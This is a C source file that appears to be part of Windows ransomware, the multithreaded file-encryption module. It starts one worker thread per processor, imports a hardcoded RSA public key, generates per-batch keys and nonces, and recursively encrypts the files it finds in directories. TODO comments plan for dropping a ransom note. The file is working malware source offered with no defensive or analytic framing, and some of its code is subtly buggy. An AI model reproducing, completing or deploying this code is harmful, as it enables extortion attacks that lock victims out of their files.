#include "Threading.h"
THREAD_STRUCT threadStruct;

int checkDirName(LPSTR directoryName) {
	//TODO: fill this
	return 0;
}
int checkFileName(LPSTR directoryName) {
	//TODO: fill this
	return 0;
}


int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, BYTE* key, BYTE* nonce, LPSTR directoryName, THREAD_STRUCT* pThreadStruct) {
	//TODO: implement dropping ransom note
	HANDLE hSearchHandle = NULL;
	WIN32_FIND_DATAA findFileData = WIN32_FIND_DATAA();
	hSearchHandle = FindFirstFileA(directoryName, &findFileData);
	LPCSTR fileName = NULL;
	int returnValue = -1;
	if (hSearchHandle == INVALID_HANDLE_VALUE) {
		printf("FindFirstFile %s fails.\n", directoryName);
		goto CLEANUP;
	}

	do {
		if (lstrcmpA(findFileData.cFileName, ".")) {
			if (lstrcmpA(findFileData.cFileName, "..")) {
				if (findFileData.dwFileAttributes != FILE_ATTRIBUTE_REPARSE_POINT) {
					if (findFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
						if (checkDirName(findFileData.cFileName) == -1) {
							continue;
						}
						fileName = (LPCSTR)calloc(strlen(findFileData.cFileName), 1);
						if (!fileName) {
							continue;
						}
						strcpy((char*)fileName, findFileData.cFileName);
						// Add directory name back to thread struct.
						// Drop ransom note
					}
					else {
						if (checkFileName(findFileData.cFileName) == -1) {
							continue;
						}
						fileName = (LPCSTR)calloc(strlen(findFileData.cFileName), 1);
						if (!fileName) {
							continue;
						}
						strcpy((char*)fileName, findFileData.cFileName);
						if (fileEncrypt(hCryptProv, publicKey, fileName, key, nonce) == -1) {
							printf("Encrypt file %s fails\n", findFileData.cFileName);
						}
					}
				}
			}
		}
		if (fileName) {
			free((void*)fileName);
			fileName = NULL;
		}
	} while (FindNextFileA(hSearchHandle, &findFileData));
	returnValue = 0;
CLEANUP:
	if (hSearchHandle) {
		FindClose(hSearchHandle);
	}
	if (fileName) {
		free((void*)fileName);
		fileName = NULL;
	}
	return 0;
}

// make sure cryptinit has been called already
void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
	HCRYPTPROV hCryptProv;
	HCRYPTKEY publicKey;
	BYTE* key = NULL;
	BYTE* nonce = NULL;
	int returnVal = -1;
	if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, 0)) {
		printf("CryptAcquireContext fails.\n");
		goto CLEANUP;
	}

	if (CryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
		goto CLEANUP;
	}

	while (TRUE) {
		while (TRUE) {
			EnterCriticalSection(&pThreadStruct->threadCriticalSection);
			if (pThreadStruct->dirPath || pThreadStruct->isEncrypting == FALSE) {
				break;
			}
			LeaveCriticalSection(&pThreadStruct->threadCriticalSection);
			Sleep(5000);
		}
		LeaveCriticalSection(&pThreadStruct->threadCriticalSection);

		if (pThreadStruct->isEncrypting == FALSE) {
			break;
		}
		key = (BYTE*)calloc(256, 1);
		if (!key) {
			goto CLEANUP;
		}

		nonce = (BYTE*)calloc(8, 1);
		if (!nonce) {
			goto CLEANUP;
		}

		if (generateKeyNonce(hCryptProv, key, nonce) == -1) {
			goto CLEANUP;
		}
		mainThreadEncryption(hCryptProv, publicKey, key, nonce, pThreadStruct->dirPath, pThreadStruct);
		free(pThreadStruct->dirPath);
		memset(key, 0, 256);
		memset(nonce, 0, 8);
	}

CLEANUP:
	if (hCryptProv) {
		CryptReleaseContext(hCryptProv, 0);
	}
	if (key) {
		free(key);
	}
	if (nonce) {
		free(nonce);
	}
	ExitThread(returnVal);
}

int initThreadStruct() {
	THREAD_STRUCT* pThreadStruct = &threadStruct;
	pThreadStruct->dirPath = NULL;

	SYSTEM_INFO systemInfo = SYSTEM_INFO();

	GetNativeSystemInfo(&systemInfo);

	pThreadStruct->threadCount = systemInfo.dwNumberOfProcessors;
	pThreadStruct->isEncrypting = FALSE;

	HANDLE* buffer = (HANDLE*)calloc(4 * pThreadStruct->threadCount, 1);
	if (!buffer) {
		return -1;
	}
	InitializeCriticalSection(&pThreadStruct->threadCriticalSection);
	pThreadStruct->threadArray = buffer;
	return 0;
}


int launchThreadEncrypt() {
	THREAD_STRUCT* pThreadStruct = &threadStruct;
	pThreadStruct->isEncrypting = TRUE;
	for (int i = 0; i < pThreadStruct->threadCount; i++) {
		pThreadStruct->threadArray[i] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)threadEncrypt, pThreadStruct, 0, 0);
		if (pThreadStruct->threadArray[i] == 0 || pThreadStruct->threadArray[i] == INVALID_HANDLE_VALUE) {
			continue;
		}
	}
	return 0;
}


void cleanUpThreadStruct() {
	THREAD_STRUCT* pThreadStruct = &threadStruct;
	DeleteCriticalSection(&pThreadStruct->threadCriticalSection);
	if (pThreadStruct->threadArray) {
		for (int i = 0; i < pThreadStruct->threadCount; i++) {
			if (pThreadStruct->threadArray[i]) {
				CloseHandle(pThreadStruct->threadArray[i]);
			}
		}
		free(pThreadStruct->threadArray);
	}
}